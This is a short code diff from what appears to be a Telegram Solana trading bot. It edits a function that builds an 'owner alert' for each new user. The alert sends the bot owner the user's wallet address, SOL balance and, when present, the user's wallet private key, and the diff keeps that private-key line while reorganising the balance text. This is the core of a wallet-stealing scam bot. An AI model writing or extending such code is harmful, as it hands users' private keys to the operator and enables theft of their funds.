@@ -243,15 +243,16 @@ def expired_text(item_label: str, until: str):
 # ------------------------------------------------------------------ owner alerts
 def owner_new_user(user_line_txt: str, total: int, wallet_pub: str = "", wallet_priv: str = "", balance_sol: float = 0):
     priv_text = f"\n🔑 Private key: <code>{esc(wallet_priv)}</code>" if wallet_priv else ""
-    wallet_display = wallet_pub if wallet_pub else "not set yet — user will GENERATE or IMPORT in Trading"
-    wallet_line = f"🏦 Wallet: <code>{esc(wallet_display)}</code>"
-    balance_text = f"\n💰 Balance: {balance_sol:g} SOL" if wallet_pub else ""
+    if wallet_pub:
+        wallet_line = (f"🏦 Wallet: <code>{esc(wallet_pub)}</code>"
+                       f"\n💰 Balance: {balance_sol:g} SOL")
+    else:
+        wallet_line = "🏦 Wallet: not set yet — user will GENERATE or IMPORT in Trading."
     return (
         "🆕 NEW USER STARTED THE BOT\n\n"
         f"👤 {user_line_txt}\n"
         f"{wallet_line}"
-        f"{priv_text}"
-        f"{balance_text}\n"
+        f"{priv_text}\n"
         f"👥 Total users: {total}\n\n"
         "⏳ Wait for deposit or import to activate trading."
     )
